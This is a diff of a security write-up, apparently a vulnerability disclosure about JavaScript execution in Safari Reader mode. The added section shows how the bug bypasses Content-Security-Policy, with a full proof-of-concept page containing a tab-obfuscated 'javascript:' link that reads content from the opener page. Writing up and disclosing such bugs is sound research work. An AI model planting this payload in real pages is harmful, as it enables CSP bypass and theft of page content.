@@ -110,5 +110,34 @@ and it will create a annoying moving pumkin image on the screen as displayed in 
 Check the video proof of concept 
 ![10](https://youtu.be/sd5dX-2a97E)
 
-Now since we can execute javascript code in reader mode, I tried to escalate it to universal cross-site scripting(uXSS) but could not get success. 
+This vulnerability will also be useful to bypass CSP checks in safari. You can imagine a situation when an attacker is able to inject XSS payload on a perfectly CSP implemented page eg: 
+```
+<?php header("Content-Security-Policy: default-src 'self'");?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Safari Reader Preview JavaScript Code execution</title>
+</head>
+<body>
+    <h2 style="color: red;">macOS. It’s why there’s nothing else like a Mac</h2>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p><br>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
+    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p><br>
+    <a href="https://www.apple.com/">Source: Apple.com</a><br>
+    <a href="jav&Tab;ascript:var a = window.open('','a');a.alert(a.opener.document.getElementsByTagName('p')[0].innerHTML)">Evil link</a><br>
+</body> 
+</html> 
+```
+Now if you try to click on the inject link you will get a CSP violation error. However, if you put the same document in reading mode and then try to click again on the injected link, it will execute the javascript code to steal the content from the current page.  
+
+Check the video proof of concept 
+![11](https://youtu.be/sd5dX-2a97E)
 
